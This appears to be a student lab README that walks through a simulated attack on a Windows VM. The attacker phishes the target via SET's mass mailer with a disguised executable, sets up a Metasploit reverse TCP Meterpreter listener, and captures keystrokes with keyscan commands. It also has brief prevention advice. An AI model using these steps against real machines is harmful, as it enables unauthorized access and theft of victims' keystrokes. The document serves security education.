# <p align="center"> Keylogger

## Introduction

This project details the deployment and analysis of a keylogging exploit using the Metasploit Framework. The project aims to demonstrate the process of unauthorized access and keystroke monitoring on a target machine, emphasizing the critical importance of secure coding practices and regular system updates. By leveraging the comprehensive tools provided by Metasploit, including msfvenom for payload creation and the Social-Engineer Toolkit (SET) for social engineering attacks, this project simulates a real-world cyber-attack scenario. The methodology encompasses setting up a controlled lab environment with virtual machines, configuring network settings, and executing a phishing campaign to deliver the payload. This report provides a step-by-step account of the entire process,

## Choice of Exploit

- I utilized the Metasploit Framework to deploy a keylogger. This method was chosen because Metasploit offers a comprehensive set of tools for exploiting vulnerabilites and deploying payloads like keyloggers. It demonstrates the process of gaining unauthorized access then monitoring keystrokes on a target machine, emphasizing the importance of secure coding and regurlar system updates.

## Emulations Setup

***Lab Enviroment Configuration:***
- ***Attacker VM:*** Setup a Kali Linux VM to serve as the attacker's machine. This VM will create the payload with msfvenom, host it using the Pythons HTTP server, send the phishing email via SET’s Mass Email Attack feature, and then deploy keylogger to monitor keystrokes.
- ***Target VM:*** Configure a Windows VM as the target for receiving the phishing email and accessing the payload.

***NAT Network Configuration:***
- Kali Linux (Attacker) and Windows (Target) VMs should be configured to use a NAT network. This setup allows for the VMs to share the host machine’s internet connection while isolating them from the host’s network and each other.

***Disabling Windows Security Settings:***
- Turn off all security settings on the Windows target VM, including Windows Defender and any installed antivirus programs. This step is essential to allow the payload to execute without being blocked or flagged by the system’s security measures.
- Navigate to Windows Security settings and turn off features like real-time protection, cloud-delivered protection, and automatic sample submission to prevent the system from intercepting the payload.

***Payload Hosting on Attacker VM:***
- Host the “AdvancedDentalResearchFinding.exe” payload using Python’s HTTP server.
  ```python3 -m http.server```
- The payload is now accessible through the attackers VMs internal IP address on the NAT network.

***Listener Setup on Attacker VM:***
- Open msfconsole on the Kali Linux VM to configure a listener for a reverse TCP connection

  ```use exploit/multi/handler```

  ```set payload windows/meterpreter/reverse_tcp```

  ```set lhost 192.168.100.4```

  ```set lport 5555```

  ```run```

- This configuration listens for the reverse TCP connection from the payload executed on the target machine.

## Step-by-Step Deployment

***Payload creation with msfvenom***
- Create the reverse TCP payload using msfvenom

![image](https://github.com/user-attachments/assets/8c38f1fd-a159-42b6-83c6-df610d2e3fc0)

***Use Python to create HTTP server to host payload

  ```python3 -m http.server```

![image](https://github.com/user-attachments/assets/75f201f0-9d13-4771-967a-7068a2a3365b)

***Setup a listner using msfconsole***
- Run msfconsole

![image](https://github.com/user-attachments/assets/2c82b8ab-9631-4f1c-9d7a-08ebac496d16)

- Use exploit/multi/handler

![image](https://github.com/user-attachments/assets/ce44fda2-5746-40a9-ad8b-9c5bad4b97bc)

- Set payload windows/meterpreter/reverse_tcp

![image](https://github.com/user-attachments/assets/2c7681d9-7d49-4965-934b-89ca71167d71)

- Use show options command to display required payload options

![image](https://github.com/user-attachments/assets/c8bc2005-e16a-4b59-85ce-742bb9d4f128)

- Set lhost to 192.168.100.4

![image](https://github.com/user-attachments/assets/33ff1650-c4d3-4bf3-b925-b2e2e245b990)

- Use show options command to display updated payload options

![image](https://github.com/user-attachments/assets/1418ef1c-b2b8-4dfa-a84c-d502d06cd0f6)

- set lport to 5555 (port used by payload)

![image](https://github.com/user-attachments/assets/6cb9ca0e-c198-42bd-9035-2706c1c53f1e)

- Use show options command to display updated payload options

![image](https://github.com/user-attachments/assets/89077835-01e8-4539-b706-c97a1d4aaf1e)

- Run the exploit

![image](https://github.com/user-attachments/assets/a65f8469-7f23-4f4f-8b70-8699da4c126e)

***Use The Social-Engineer ToolKit (SET) to send the payload to the target***
- Run SET and select option [1] Social-Engineering Attacks

![image](https://github.com/user-attachments/assets/9dca8624-683c-4421-ae70-6fa83d2e0b9d)

- Select option [5] Mass Mailer Attack

![image](https://github.com/user-attachments/assets/6bf02f71-6263-45a0-bc33-410dd373da28)

- Select option [1] E-Mail Attack Single Email Address

![image](https://github.com/user-attachments/assets/3bb8ea03-18f3-4d49-a66e-dcbfb172047c)

- Select option [2] One-Time Use Email Template

![image](https://github.com/user-attachments/assets/dc0dcfc0-10f9-45f7-a3e9-3e340d8b8835)

- Fill in all the information for the email

![image](https://github.com/user-attachments/assets/3d7f62e8-e074-4213-846c-c1c7a090148f)

***Target View***
- Email inbox view of target

![image](https://github.com/user-attachments/assets/ebd66aad-c5f7-449a-a846-80e610a2e1db)

- Email view with payload attached

![image](https://github.com/user-attachments/assets/a49dbf72-56e9-4bc3-a48b-7d4e2a456fac)

- Target view after clicking link

![image](https://github.com/user-attachments/assets/937f9483-2d0d-4525-8ed0-3352a6e8b13f)

- Pop up message displays when clicking the download file indicating that the file is harmful. For this demonstration, we will select keep

 ![image](https://github.com/user-attachments/assets/312c7dd4-ee9b-43da-a7ab-6a4451ecdb34)

 - Select open file

![image](https://github.com/user-attachments/assets/99333d71-621b-41fc-b810-4bdd2c933fdf)

- Select Run

![image](https://github.com/user-attachments/assets/c4ca96f7-5132-4d65-a82d-e4c7d50afec9)

***Attacker View***
- Check listener in msfconsole for reverse TCP successful connection

![image](https://github.com/user-attachments/assets/4610f417-c50d-4c46-87ed-dd6fe3522079)

- Use ```keyscan_start``` command to initiate keylogging process

![image](https://github.com/user-attachments/assets/c2f390ab-4fbd-457c-b4f8-f956e01a510a)

- Use ```keyscan_dump``` command to display the keystrokes that have been captured

![image](https://github.com/user-attachments/assets/38353a57-6a3e-41d7-9dab-460d3cca4f63)

## Preventative Measures

- ***Keep Systems Updated:*** Emphasize the importance of keeping all software and operating systems up to date to protect against known vulnerabilties.
- ***Install and Maintain Antivirus Software:*** Emphasize the importance of active antivirus and anit-malware solutions that detect and blcok malicious activities, including unauthorized keyloggers.
- ***Implement Firewalls:*** Utilize network firewalls to block unauthorized access to computer systems. 

## Conclusion

The keylogging project successfully demonstrated the vulnerabilities inherent in unprotected systems and the ease with which malicious actors can exploit these weaknesses using tools like the Metasploit Framework. Through the detailed execution of the exploit, it became evident that maintaining robust security measures, such as regular software updates, active antivirus solutions, and effective firewall configurations, are crucial in defending against such attacks. 
